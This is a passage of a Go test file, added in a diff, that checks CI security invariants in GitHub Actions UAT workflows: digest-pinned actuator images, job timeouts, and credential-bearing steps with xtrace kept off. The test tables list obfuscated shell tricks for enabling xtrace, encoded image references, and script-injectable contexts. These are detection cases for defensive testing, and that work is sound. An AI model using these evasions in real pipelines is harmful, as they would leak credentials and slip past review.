@@ -1,0 +1,2587 @@
+// Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES.  All rights reserved.
+//
+// Licensed under the Apache License, Version 2.0 (the "License");
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+//
+//     http://www.apache.org/licenses/LICENSE-2.0
+//
+// Unless required by applicable law or agreed to in writing, software
+// distributed under the License is distributed on an "AS IS" BASIS,
+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+// See the License for the specific language governing permissions and
+// limitations under the License.
+
+package uat
+
+import (
+	_ "crypto/sha256" // Register SHA-256 for github.com/opencontainers/go-digest.
+	"encoding/json"
+	"fmt"
+	"maps"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"slices"
+	"strings"
+	"testing"
+	"unicode"
+
+	"github.com/distribution/reference"
+	"github.com/opencontainers/go-digest"
+	"gopkg.in/yaml.v3"
+)
+
+const (
+	workflowsDir = "../../.github/workflows"
+	actuatorRoot = "ghcr.io/mchmarny/cluster/"
+	pinnedGKERef = "${{ env.GKE_ACTUATOR_IMAGE }}"
+
+	// githubHostedRunner is the runs-on label for GitHub-hosted Ubuntu runners.
+	githubHostedRunner = "ubuntu-24.04"
+	// githubHostedJobCapMinutes is the hard 6h execution ceiling GitHub imposes
+	// on a job running on a GitHub-hosted runner. A job-level timeout-minutes
+	// above this is silently clamped to it, so a UAT teardown budget that reads
+	// above the cap would not actually take effect — the always() Destroy step
+	// would be canceled at 360m and the cluster leaked. See uat-gcp.yaml's
+	// timeout budget comment and #2066/#2067.
+	githubHostedJobCapMinutes = 360
+
+	// actionsDir holds the repo's composite actions. Their schema differs from a
+	// workflow's: steps live under runs.steps, not under a job.
+	actionsDir = "../../.github/actions"
+	// slsaPredicateAction writes the SLSA Build Provenance predicate that cosign
+	// attest-blob signs, so any value spliced into its script text ends up inside
+	// a signed attestation.
+	slsaPredicateAction = "generate-slsa-predicate/action.yml"
+	// slsaPredicateMarker is the file that step writes. Locating the step by the
+	// artifact it produces survives a rename of the step.
+	slsaPredicateMarker = "slsa-predicate.json"
+
+	// expressionOpen and expressionClose delimit an Actions expression. The
+	// runner replaces the whole span with its value in the script TEXT, before
+	// bash parses the script.
+	expressionOpen  = "${{"
+	expressionClose = "}}"
+
+	// eventContextPrefix covers github.event.*, the webhook payload, which
+	// carries pull request titles, branch names and commit messages verbatim.
+	eventContextPrefix = "github.event."
+
+	// computedIndexMarker ends a context path that is followed by an index the
+	// scanner cannot read as a literal ['key'], and stands alone for any index on
+	// a function result, which no path describes. A context path is otherwise
+	// made of identifier characters and dots only, so the marker cannot occur by
+	// accident.
+	computedIndexMarker = "[*]"
+
+	// Inputs for the rendered predicate. Only their distinguishability in the
+	// emitted JSON matters.
+	slsaPredicateRepository   = "NVIDIA/aicr"
+	slsaPredicateSHA          = "4f264720bf67d676189e39af6079cb781d4918ee"
+	slsaPredicateRunID        = "17600000001"
+	slsaPredicateWorkflowFile = "on-tag.yaml"
+)
+
+// refBearingUATWorkflows are the UAT lanes whose Test Summary step reports the
+// branch under test. They are checked together because the lanes are written
+// from one another, so a shape travels between them by copy: uat-kind-sim
+// inherited the injectable form from uat-kind, and uat-aws and uat-gcp carried
+// it independently until 4f264720.
+var refBearingUATWorkflows = []string{
+	"uat-kind-sim.yaml",
+	"uat-kind.yaml",
+	"uat-aws.yaml",
+	"uat-gcp.yaml",
+	"uat-azure.yaml",
+}
+
+// attackerChosenContexts name the Actions contexts whose CONTENT is chosen by
+// whoever pushes the branch or opens the pull request, and which therefore must
+// never be substituted into a script's text. The bare github object is one of
+// them: toJSON(github) serializes every field below it, head_ref included.
+var attackerChosenContexts = []string{
+	"github",
+	"github.ref",
+	"github.ref_name",
+	"github.head_ref",
+	"github.base_ref",
+}
+
+type actuatorExpectation struct {
+	name       string
+	file       string
+	job        string
+	envVar     string
+	repository string
+}
+
+var actuatorExpectations = []actuatorExpectation{
+	{"AWS", "uat-aws.yaml", "uat-aws", "EKS_IMAGE", "ghcr.io/mchmarny/cluster/eks"},
+	{"Azure", "uat-azure.yaml", "uat-azure", "AKS_ACTUATOR_IMAGE", "ghcr.io/mchmarny/cluster/aks"},
+	{"GCP", "uat-gcp.yaml", "uat-gcp", "GKE_ACTUATOR_IMAGE", "ghcr.io/mchmarny/cluster/gke"},
+}
+
+type credentialApplyExpectation struct {
+	name       string
+	authOutput string
+}
+
+var credentialApplyExpectations = []credentialApplyExpectation{
+	{"bringup", "${{ steps.auth.outputs.credentials_file_path }}"},
+	{"teardown", "${{ steps.auth_teardown.outputs.credentials_file_path }}"},
+}
+
+var actuatorStepNames = []string{"Bringup Infra", "Destroy Cluster"}
+
+// awsTokenBearingStepNames enumerates AWS-lane steps that carry credentials
+// via env (not credentials_file_path). Adding the argocd deployer variant
+// wired GITHUB_TOKEN into the install step so install_argocd can provision
+// the ghcr.io repo-creds Secret (see .github/workflows/uat-aws.yaml + issue
+// #2194). The install path never enables `set -x` today and the token is
+// scoped to `packages: write`, so this is a low-value invariant pin rather
+// than a gap in protection — the pin exists so a future set -x addition in
+// the install step (an addition invisible in an env-only diff) is caught by
+// TestCredentialBearingUATStepsDisableXtrace instead of leaking the token
+// into log lines.
+var awsTokenBearingStepNames = []string{"UAT - install (helmfile apply or argocd sync)"}
+
+type workflowDocument struct {
+	Env      map[string]string      `yaml:"env"`
+	Defaults workflowDefaults       `yaml:"defaults"`
+	Jobs     map[string]workflowJob `yaml:"jobs"`
+}
+
+type workflowJob struct {
+	Env            map[string]string `yaml:"env"`
+	Defaults       workflowDefaults  `yaml:"defaults"`
+	Steps          []workflowStep    `yaml:"steps"`
+	RunsOn         string            `yaml:"runs-on"`
+	TimeoutMinutes int               `yaml:"timeout-minutes"`
+	If             string            `yaml:"if"`
+}
+
+type workflowDefaults struct {
+	Run workflowRunDefaults `yaml:"run"`
+}
+
+type workflowRunDefaults struct {
+	Shell string `yaml:"shell"`
+}
+
+type workflowStep struct {
+	Name  string            `yaml:"name"`
+	ID    string            `yaml:"id"`
+	If    string            `yaml:"if"`
+	Run   string            `yaml:"run"`
+	Shell string            `yaml:"shell"`
+	Env   map[string]string `yaml:"env"`
+}
+
+type dockerInvocation struct {
+	image     string
+	arguments []string
+}
+
+func TestUATActuatorInvocationsArePinnedApplyCommands(t *testing.T) {
+	for _, tt := range actuatorExpectations {
+		t.Run(tt.name, func(t *testing.T) {
+			node := loadWorkflow(t, tt.file)
+			var workflow workflowDocument
+			if err := node.Decode(&workflow); err != nil {
+				t.Fatalf("decode %s: %v", tt.file, err)
+			}
+
+			job, ok := workflow.Jobs[tt.job]
+			if !ok {
+				t.Fatalf("%s: missing job %q", tt.file, tt.job)
+			}
+			ref, ok := job.Env[tt.envVar]
+			if !ok || ref == "" {
+				t.Fatalf("%s: job %q missing %s", tt.file, tt.job, tt.envVar)
+			}
+
+			if err := parsePinnedActuatorReference(ref, tt.repository); err != nil {
+				t.Errorf("%s must be an immutable %s SHA-256 reference: %v", tt.envVar, tt.repository, err)
+			}
+			for _, step := range job.Steps {
+				if _, overrides := step.Env[tt.envVar]; overrides {
+					t.Errorf("step %q must not override job-level %s", step.Name, tt.envVar)
+				}
+			}
+
+			expectedImage := fmt.Sprintf("${{ env.%s }}", tt.envVar)
+			for _, stepName := range actuatorStepNames {
+				step := uniqueStepNamed(t, job.Steps, stepName)
+				invocations, err := parseDockerInvocations(step.Run)
+				if err != nil {
+					t.Fatalf("parse Docker runs in step %q: %v", step.Name, err)
+				}
+				if len(invocations) != 1 {
+					t.Fatalf("step %q contains %d Docker runs, want exactly one", step.Name, len(invocations))
+				}
+				invocation := invocations[0]
+				if invocation.image != expectedImage {
+					t.Errorf("step %q uses Docker image %q, want pinned job image %q", step.Name, invocation.image, expectedImage)
+				}
+				if !slices.Equal(invocation.arguments, []string{"apply"}) {
+					t.Errorf("step %q uses actuator arguments %q, want exactly [apply]", step.Name, invocation.arguments)
+				}
+			}
+		})
+	}
+}
+
+// TestUATCloudJobTimeoutsWithinPlatformCap guards the teardown-on-cancel
+// budgets: the three cloud UAT jobs run on GitHub-hosted runners, which hard-cap
+// a job at 360m. A job-level timeout-minutes above that is silently clamped, so a
+// budget that reads higher would not take effect and the always() Destroy step
+// would be canceled at 360m — leaking the cluster #2066/#2067 exist to protect.
+func TestUATCloudJobTimeoutsWithinPlatformCap(t *testing.T) {
+	for _, tt := range actuatorExpectations {
+		t.Run(tt.name, func(t *testing.T) {
+			workflow := decodeWorkflow(t, tt.file)
+			job, ok := workflow.Jobs[tt.job]
+			if !ok {
+				t.Fatalf("%s: missing job %q", tt.file, tt.job)
+			}
+			if job.RunsOn != githubHostedRunner {
+				t.Fatalf("%s: job %q runs-on %q, want %q (GitHub-hosted cap assumption)",
+					tt.file, tt.job, job.RunsOn, githubHostedRunner)
+			}
+			if job.TimeoutMinutes <= 0 {
+				t.Fatalf("%s: job %q must set an explicit timeout-minutes so an "+
+					"overrun cannot cancel the always() teardown", tt.file, tt.job)
+			}
+			if job.TimeoutMinutes > githubHostedJobCapMinutes {
+				t.Errorf("%s: job %q timeout-minutes=%d exceeds the GitHub-hosted cap of %d; "+
+					"a value above the cap is silently clamped and the budget comment would lie",
+					tt.file, tt.job, job.TimeoutMinutes, githubHostedJobCapMinutes)
+			}
+		})
+	}
+}
+
+// TestGKEBringupGatesBroughtUpOnNodePoolsRunning pins the false-green fix: an
+// actuator exit 0 (e.g. a no-change plan over a retained ERROR pool) must not by
+// itself mark the cluster brought up. The Bringup Infra step must additionally
+// require every node pool to report RUNNING before setting brought_up=true, and
+// must fail closed when it does not. Without this a broken cluster is held on
+// daytime-up/skip_delete and #2067's failure() teardown never fires.
+func TestGKEBringupGatesBroughtUpOnNodePoolsRunning(t *testing.T) {
+	workflow := decodeWorkflow(t, "uat-gcp.yaml")
+	job, ok := workflow.Jobs["uat-gcp"]
+	if !ok {
+		t.Fatal("uat-gcp.yaml: missing job \"uat-gcp\"")
+	}
+	step := uniqueStepNamed(t, job.Steps, "Bringup Infra")
+
+	// The readiness gate: list node-pool statuses and reject unless every line is
+	// exactly RUNNING (grep -qvx RUNNING matches any non-RUNNING/extra line).
+	for _, marker := range []string{
+		"gcloud container node-pools list",
+		"--format='value(status)'",
+		"grep -qvx 'RUNNING'",
+		"brought_up=true",
+	} {
+		if !strings.Contains(step.Run, marker) {
+			t.Errorf("Bringup Infra step must contain %q to gate brought_up on node-pool readiness", marker)
+		}
+	}
+
+	// Fail-closed guard: a run that never set brought_up must exit non-zero so a
+	// docker-run-in-`if` (which does not trip set -e) cannot proceed on exit 0.
+	if !strings.Contains(step.Run, `if [ "$brought_up" != true ]; then`) {
+		t.Error("Bringup Infra step must fail closed (exit non-zero) when brought_up was never set")
+	}
+}
+
+func TestParsePinnedActuatorReference(t *testing.T) {
+	const repository = "ghcr.io/mchmarny/cluster/gke"
+	const hash = "f586ffa14dccb867c81fb8a12484f6e31d3adad93242292b7c9cc00c93af2367"
+	tests := []struct {
+		name    string
+		value   string
+		wantErr bool
+	}{
+		{"digest only", repository + "@sha256:" + hash, false},
+		{"tag and digest", repository + ":v0.5.16@sha256:" + hash, false},
+		{"tag only", repository + ":v0.5.16", true},
+		{"short digest", repository + "@sha256:abcd", true},
+		{"uppercase digest", repository + "@sha256:" + strings.ToUpper(hash), true},
+		{"wrong repository", "ghcr.io/mchmarny/cluster/eks@sha256:" + hash, true},
+		{"trailing suffix", repository + "@sha256:" + hash + "-extra", true},
+		{"trailing reference", repository + "@sha256:" + hash + " " + repository + ":latest", true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parsePinnedActuatorReference(tt.value, repository)
+			if (err != nil) != tt.wantErr {
+				t.Fatalf("parsePinnedActuatorReference(%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestUATWorkflowsContainNoMutableActuatorReferences(t *testing.T) {
+	paths, err := filepath.Glob(filepath.Join(workflowsDir, "uat-*.yaml"))
+	if err != nil {
+		t.Fatalf("glob UAT workflows: %v", err)
+	}
+	if len(paths) == 0 {
+		t.Fatal("no UAT workflows found")
+	}
+
+	for _, path := range paths {
+		file := filepath.Base(path)
+		node := loadWorkflow(t, file)
+		walkStringScalars(node, func(value string) {
+			refs, parseErr := actuatorReferenceTokens(value)
+			if parseErr != nil {
+				t.Errorf("%s contains an unparseable actuator reference command: %v", file, parseErr)
+				return
+			}
+			for _, raw := range refs {
+				named, err := reference.ParseNormalizedNamed(raw)
+				if err != nil {
+					t.Errorf("%s contains malformed actuator reference %q: %v", file, raw, err)
+					continue
+				}
+				if err := parsePinnedActuatorReference(raw, named.Name()); err != nil {
+					t.Errorf("%s contains mutable actuator reference %q: %v", file, raw, err)
+				}
+			}
+		})
+	}
+}
+
+func TestActuatorReferenceTokens(t *testing.T) {
+	tests := []struct {
+		name string
+		text string
+		want []string
+	}{
+		{"plain reference", `docker run ghcr.io/mchmarny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"adjacent quoted fragments", `docker run ghcr.io/mchmarny/clu''ster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"split registry owner", `docker run ghcr.io/mch''marny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"ANSI-C encoded dot", `docker run ghcr$'\x2e'io/mchmarny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"ANSI-C encoded slash", `docker run ghcr.io$'\x2f'mchmarny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"ANSI-C octal punctuation", `docker run ghcr$'\056'io$'\057'mchmarny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"ANSI-C octal width", `docker run ghcr$'\0056'io/mchmarny/cluster/gke:latest apply`, nil},
+		{"ANSI-C Unicode punctuation", `docker run ghcr$'\u002e'io$'\u002f'mchmarny/cluster/gke:latest apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"fully ANSI-C encoded reference", `docker run $'\x67\x68\x63\x72\x2e\x69\x6f\x2f\x6d\x63\x68\x6d\x61\x72\x6e\x79\x2f\x63\x6c\x75\x73\x74\x65\x72\x2f\x67\x6b\x65\x3a\x6c\x61\x74\x65\x73\x74' apply`, []string{"ghcr.io/mchmarny/cluster/gke:latest"}},
+		{"commented reference", `# docker run ghcr.io/mchmarny/cluster/gke:latest apply`, nil},
+		{"heredoc reference", "cat <<EOF\ndocker run ghcr.io/mchmarny/cluster/gke:latest apply\nEOF", nil},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := actuatorReferenceTokens(tt.text)
+			if err != nil {
+				t.Fatalf("actuatorReferenceTokens() error = %v", err)
+			}
+			if !slices.Equal(got, tt.want) {
+				t.Fatalf("actuatorReferenceTokens() = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestActuatorReferenceTokensRejectsContinuedToken(t *testing.T) {
+	value := "docker run ghcr.io/mchmar\\\nny/cluster/gke:latest apply"
+	if _, err := actuatorReferenceTokens(value); err == nil {
+		t.Fatal("actuatorReferenceTokens() error = nil, want unsupported continued token error")
+	}
+}
+
+func TestActuatorReferenceTokensRejectsMalformedANSIQuoting(t *testing.T) {
+	tests := []struct {
+		name  string
+		value string
+	}{
+		{"malformed hex escape", `docker run ghcr$'\x'io/mchmarny/cluster/gke:latest apply`},
+		{"unsupported escape", `docker run ghcr$'\q'io/mchmarny/cluster/gke:latest apply`},
+		{"NUL escape", `docker run ghcr$'\x00'io/mchmarny/cluster/gke:latest apply`},
+		{"Unicode surrogate", `docker run ghcr$'\uD800'io/mchmarny/cluster/gke:latest apply`},
+		{"unterminated quote", `docker run ghcr$'\x2eio/mchmarny/cluster/gke:latest apply`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if _, err := actuatorReferenceTokens(tt.value); err == nil {
+				t.Fatal("actuatorReferenceTokens() error = nil, want malformed ANSI-C quote error")
+			}
+		})
+	}
+}
+
+func TestActuatorReferenceTokensIgnoresUnrelatedANSIQuoting(t *testing.T) {
+	value := `s=${s//$'\r'/'%0D'}; s=${s//$'\n'/'%0A'}`
+	refs, err := actuatorReferenceTokens(value)
+	if err != nil {
+		t.Fatalf("actuatorReferenceTokens() error = %v", err)
+	}
+	if len(refs) != 0 {
+		t.Fatalf("actuatorReferenceTokens() = %v, want no references", refs)
+	}
+}
+
+func TestGKECredentialApplyStepsUsePinnedImageAndExpectedAuth(t *testing.T) {
+	workflow := decodeWorkflow(t, "uat-gcp.yaml")
+	job, ok := workflow.Jobs["uat-gcp"]
+	if !ok {
+		t.Fatal("uat-gcp.yaml: missing uat-gcp job")
+	}
+	credentialSteps := stepsWithDockerRun(t, job.Steps)
+	if len(credentialSteps) != len(credentialApplyExpectations) {
+		t.Fatalf("found %d credential-bearing steps, want %d", len(credentialSteps), len(credentialApplyExpectations))
+	}
+	seen := make(map[string]bool, len(credentialApplyExpectations))
+	for _, step := range credentialSteps {
+		matched := make([]credentialApplyExpectation, 0, 1)
+		for _, expected := range credentialApplyExpectations {
+			environment := `KEY_CONTENT="$(base64 < ` + expected.authOutput + `)"`
+			if activeDockerRunMatches(step.Run, pinnedGKERef+" apply", environment) {
+				matched = append(matched, expected)
+			}
+		}
+		if len(matched) != 1 {
+			t.Fatalf("step %q matched %d expected auth outputs, want exactly one", step.Name, len(matched))
+		}
+		expected := matched[0]
+		if seen[expected.name] {
+			t.Fatalf("auth output for %s is used by more than one credential step", expected.name)
+		}
+		seen[expected.name] = true
+	}
+	for _, expected := range credentialApplyExpectations {
+		if !seen[expected.name] {
+			t.Errorf("missing credential apply step for %s", expected.name)
+		}
+	}
+}
+
+func TestCredentialBearingUATStepsDisableXtrace(t *testing.T) {
+	tests := []struct {
+		name        string
+		file        string
+		job         string
+		selectSteps func(*testing.T, []workflowStep) []workflowStep
+	}{
+		{
+			"AWS", "uat-aws.yaml", "uat-aws",
+			func(t *testing.T, steps []workflowStep) []workflowStep {
+				selected := make([]workflowStep, 0, len(actuatorStepNames)+len(awsTokenBearingStepNames))
+				for _, stepName := range actuatorStepNames {
+					selected = append(selected, uniqueStepNamed(t, steps, stepName))
+				}
+				// Token-bearing steps (env-only credentials) — see the
+				// awsTokenBearingStepNames comment for the argocd deployer
+				// rationale.
+				for _, stepName := range awsTokenBearingStepNames {
+					selected = append(selected, uniqueStepNamed(t, steps, stepName))
+				}
+				return selected
+			},
+		},
+		{
+			"GCP", "uat-gcp.yaml", "uat-gcp",
+			func(t *testing.T, steps []workflowStep) []workflowStep {
+				selected := make([]workflowStep, 0, len(credentialApplyExpectations))
+				for _, expected := range credentialApplyExpectations {
+					selected = append(selected, uniqueStepUsing(t, steps, expected.authOutput))
+				}
+				return selected
+			},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			workflow := decodeWorkflow(t, tt.file)
+			job, ok := workflow.Jobs[tt.job]
+			if !ok {
+				t.Fatalf("%s: missing %s job", tt.file, tt.job)
+			}
+			if shellEnvironmentEnablesXtrace(workflow.Env) || shellEnvironmentEnablesXtrace(job.Env) {
+				t.Fatal("workflow or job environment can enable xtrace for credential-bearing steps")
+			}
+			if shellEnablesXtrace(workflow.Defaults.Run.Shell) || shellEnablesXtrace(job.Defaults.Run.Shell) {
+				t.Fatal("workflow or job default shell enables xtrace for credential-bearing steps")
+			}
+			for _, step := range tt.selectSteps(t, job.Steps) {
+				if shellEnablesXtrace(step.Run) || shellEnablesXtrace(step.Shell) || shellEnvironmentEnablesXtrace(step.Env) {
+					t.Errorf("step %q enables xtrace while handling credentials", step.Name)
+				}
+			}
+		})
+	}
+}
+
+// TestUATReadinessGateIsItsOwnStep pins the #2630 split: the readiness gate
+// runs as a step separate from the apply, so a gate that never converges is not
+// reported as an install failure, and it never receives the GITHUB_TOKEN that
+// only the argocd apply needs. Everything that requires a converged, gated
+// stack must key off the readiness step, not the install step.
+func TestUATReadinessGateIsItsOwnStep(t *testing.T) {
+	const readinessStepName = "UAT - readiness gate (validate --phase deployment)"
+	tests := []struct {
+		name  string
+		file  string
+		job   string
+		cloud string
+	}{
+		{"AWS", "uat-aws.yaml", "uat-aws", "aws"},
+		{"Azure", "uat-azure.yaml", "uat-azure", "azure"},
+		{"GCP", "uat-gcp.yaml", "uat-gcp", "gcp"},
+		{"kind", "uat-kind.yaml", "uat-kind", "kind"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			workflow := decodeWorkflow(t, tt.file)
+			job, ok := workflow.Jobs[tt.job]
+			if !ok {
+				t.Fatalf("%s: missing job %q", tt.file, tt.job)
+			}
+			installIdx, readinessIdx := -1, -1
+			for i, step := range job.Steps {
+				switch step.ID {
+				case "install":
+					installIdx = i
+				case "readiness":
+					readinessIdx = i
+				}
+			}
+			if installIdx < 0 || readinessIdx < 0 {
+				t.Fatalf("%s: install step index %d, readiness step index %d; want both present", tt.file, installIdx, readinessIdx)
+			}
+			if readinessIdx < installIdx {
+				t.Errorf("%s: readiness step must run after the install step", tt.file)
+			}
+
+			install := job.Steps[installIdx]
+			if strings.Contains(strings.ToLower(install.Name), "readiness") {
+				t.Errorf("%s: install step %q still names the readiness gate", tt.file, install.Name)
+			}
+			wantInstall := fmt.Sprintf(`./tests/uat/%s/run install "${TEST_CONFIG}"`, tt.cloud)
+			if !activeRunInvokesExactCommand(install.Run, wantInstall) {
+				t.Errorf("%s: install step must run %q", tt.file, wantInstall)
+			}
+
+			readiness := uniqueStepNamed(t, job.Steps, readinessStepName)
+			if readiness.ID != "readiness" {
+				t.Errorf("%s: step %q has id %q, want readiness", tt.file, readinessStepName, readiness.ID)
+			}
+			if !strings.Contains(readiness.If, "steps.install.outcome == 'success'") {
+				t.Errorf("%s: readiness step must gate on install success, got if: %q", tt.file, readiness.If)
+			}
+			wantReadiness := fmt.Sprintf(`./tests/uat/%s/run readiness "${TEST_CONFIG}"`, tt.cloud)
+			if !activeRunInvokesExactCommand(readiness.Run, wantReadiness) {
+				t.Errorf("%s: readiness step must run %q", tt.file, wantReadiness)
+			}
+			for _, key := range []string{"GITHUB_TOKEN", "GH_TOKEN"} {
+				if _, ok := readiness.Env[key]; ok {
+					t.Errorf("%s: readiness step must not receive %s", tt.file, key)
+				}
+			}
+			for _, key := range []string{"AICR_BIN", "RUN_ID"} {
+				if readiness.Env[key] == "" {
+					t.Errorf("%s: readiness step missing %s", tt.file, key)
+				}
+			}
+
+			conformance := uniqueStepWithID(t, job.Steps, "conformance")
+			if !strings.Contains(conformance.If, "steps.readiness.outcome == 'success'") ||
+				strings.Contains(conformance.If, "steps.install.") {
+
+				t.Errorf("%s: conformance step must gate on readiness success, not install; got if: %q", tt.file, conformance.If)
+			}
+		})
+	}
+}
+
+func TestShellEnvironmentEnablesXtrace(t *testing.T) {
+	tests := []struct {
+		name string
+		env  map[string]string
+		want bool
+	}{
+		{"empty", nil, false},
+		{"ordinary values", map[string]string{"CONFIG": "test"}, false},
+		{"shell options", map[string]string{"SHELLOPTS": "errexit:xtrace"}, true},
+		{"bash environment", map[string]string{"BASH_ENV": "/tmp/enable-xtrace"}, true},
+		{"POSIX environment", map[string]string{"ENV": "/tmp/enable-xtrace"}, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := shellEnvironmentEnablesXtrace(tt.env); got != tt.want {
+				t.Fatalf("shellEnvironmentEnablesXtrace() = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestShellEnablesXtrace(t *testing.T) {
+	tests := []struct {
+		name string
+		text string
+		want bool
+	}{
+		{"strict without xtrace", "set -euo pipefail", false},
+		{"explicit disable", "set +x", false},
+		{"short", "set -x", true},
+		{"bundled", "set -euox pipefail", true},
+		{"long", "set -o xtrace", true},
+		{"long after another option", "set -o errexit -o xtrace", true},
+		{"mid command", "echo ready; set -x; docker run", true},
+		{"later AWS xtrace", "set -euo pipefail\nfor attempt in 1 2 3; do\nset -x\n/usr/bin/docker run image apply\ndone", true},
+		{"bash short", "bash -x {0}", true},
+		{"bash bundled", "bash --noprofile -euxo pipefail {0}", true},
+		{"bash command with xtrace", `bash -xc 'echo ready'`, true},
+		{"bash long", "bash --noprofile --xtrace {0}", true},
+		{"nested bash command", `bash -c 'set -x; docker run'`, true},
+		{"comment", "# set -x", false},
+		{"inline comment", "echo ready # set -x", false},
+		{"quoted keyword concatenation", `s""et -x`, true},
+		{"ANSI-C quoted keyword", `$'set' -x`, true},
+		{"dynamic keyword", `s$(:)et -x`, true},
+		{"dynamic option variable", "flag=-x\nset \"$flag\"", true},
+		{"dynamic command variable", "cmd=set\n\"$cmd\" -x", true},
+		{"dynamic command after separator", "cmd=set\necho ready; \"$cmd\" -x", true},
+		{"dynamic command after adjacent separator", "cmd=set\necho ready;\"$cmd\" -x", true},
+		{"dynamic command after time prefix", "cmd=set\ntime \"$cmd\" -x", true},
+		{"dynamic command after time option", "cmd=set\ntime -p \"$cmd\" -x", true},
+		{"dynamic command through builtin", "cmd=set\nbuiltin \"$cmd\" -x", true},
+		{"dynamic command after attached redirection", "cmd=set\n>/tmp/xtrace.log \"$cmd\" -x", true},
+		{"dynamic command after separate redirection", "cmd=set\n> /tmp/xtrace.log \"$cmd\" -x", true},
+		{"glob expanded option", "touch -- -x\nset *", true},
+		{"glob expanded command", `/bin/ba?? -xc 'echo ready'`, true},
+		{"quoted separator argument", `echo "ready; $value"`, false},
+		{"literal command words as arguments", `echo set -x`, false},
+		{"escaped option", `set -\x`, true},
+		{"command substitution", `KEY_CONTENT="$(set -x; base64 < secret)"`, true},
+		{"eval command", `eval 'set -x'`, true},
+		{"DEBUG trap", `trap 'set -x' DEBUG`, true},
+		{"split keyword", "se\\\nt -x", true},
+		{"heredoc body", "cat <<EOF\nset -x\nEOF\nset -euo pipefail", false},
+		{"quoted heredoc body", "cat <<'EOF'\nset -x\nEOF\nset -euo pipefail", false},
+		{"active after heredoc", "cat <<-EOF\n\tset -e\n\tEOF\nset -x", true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := shellEnablesXtrace(tt.text); got != tt.want {
+				t.Fatalf("shellEnablesXtrace(%q) = %v, want %v", tt.text, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestParseDockerInvocations(t *testing.T) {
+	tests := []struct {
+		name    string
+		run     string
+		want    []dockerInvocation
+		wantErr bool
+	}{
+		{"quoted environment", `/usr/bin/docker run -e AUTO_APPROVE=true "${EKS_IMAGE}" apply`, []dockerInvocation{{"${EKS_IMAGE}", []string{"apply"}}}, false},
+		{"GitHub environment", `/usr/bin/docker run ${{ env.GKE_ACTUATOR_IMAGE }} apply`, []dockerInvocation{{pinnedGKERef, []string{"apply"}}}, false},
+		{"conditional with volume", `if /usr/bin/docker run -v "$AZ_MOUNT:/data" "${AKS_ACTUATOR_IMAGE}" apply; then`, []dockerInvocation{{"${AKS_ACTUATOR_IMAGE}", []string{"apply"}}}, false},
+		{"adjacent quoted mutable image", `/usr/bin/docker run ghcr.io/mchmarny/clu''ster/gke:latest apply`, []dockerInvocation{{"ghcr.io/mchmarny/cluster/gke:latest", []string{"apply"}}}, false},
+		{"container run mutable image", `/usr/bin/docker container run ghcr.io/mchmarny/cluster/gke:latest apply`, []dockerInvocation{{"ghcr.io/mchmarny/cluster/gke:latest", []string{"apply"}}}, false},
+		{"destroy command", `/usr/bin/docker run "${EKS_IMAGE}" destroy`, []dockerInvocation{{"${EKS_IMAGE}", []string{"destroy"}}}, false},
+		{"missing command", `/usr/bin/docker run "${EKS_IMAGE}"`, []dockerInvocation{{"${EKS_IMAGE}", nil}}, false},
+		{"extra command argument", `/usr/bin/docker run "${EKS_IMAGE}" apply unexpected`, []dockerInvocation{{"${EKS_IMAGE}", []string{"apply", "unexpected"}}}, false},
+		{"PATH-resolved Docker", `docker run "${EKS_IMAGE}" apply`, nil, true},
+		{"commented run", `# /usr/bin/docker run ghcr.io/mchmarny/cluster/gke:latest apply`, nil, false},
+		{"unsupported option", `/usr/bin/docker run --privileged "${EKS_IMAGE}" apply`, nil, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got, err := parseDockerInvocations(tt.run)
+			if (err != nil) != tt.wantErr {
+				t.Fatalf("parseDockerInvocations() error = %v, wantErr %v", err, tt.wantErr)
+			}
+			matches := slices.EqualFunc(got, tt.want, func(got, want dockerInvocation) bool {
+				return got.image == want.image && slices.Equal(got.arguments, want.arguments)
+			})
+			if !matches {
+				t.Fatalf("parseDockerInvocations() = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+func TestExecutableShellLinesRejectUnterminatedHeredoc(t *testing.T) {
+	if _, err := executableShellLines("cat <<EOF\nset -x"); err == nil {
+		t.Fatal("executableShellLines() error = nil, want unterminated heredoc error")
+	}
+}
+
+func TestCredentialRunMatching(t *testing.T) {
+	authOutput := credentialApplyExpectations[0].authOutput
+	tests := []struct {
+		name      string
+		run       string
+		wantAuth  bool
+		wantApply bool
+	}{
+		{"active lines", "-e KEY_CONTENT=\"$(base64 < " + authOutput + ")\" \\\n" + pinnedGKERef + " apply", true, true},
+		{"conditional continuation", pinnedGKERef + " apply; then", false, true},
+		{"conditional apply", "if " + pinnedGKERef + " apply; then", false, true},
+		{"commented markers", "# KEY_CONTENT=" + authOutput + "\n# " + pinnedGKERef + " apply", false, false},
+		{"inline commented markers", "echo ready # KEY_CONTENT=" + authOutput + "\necho ready # " + pinnedGKERef + " apply", false, false},
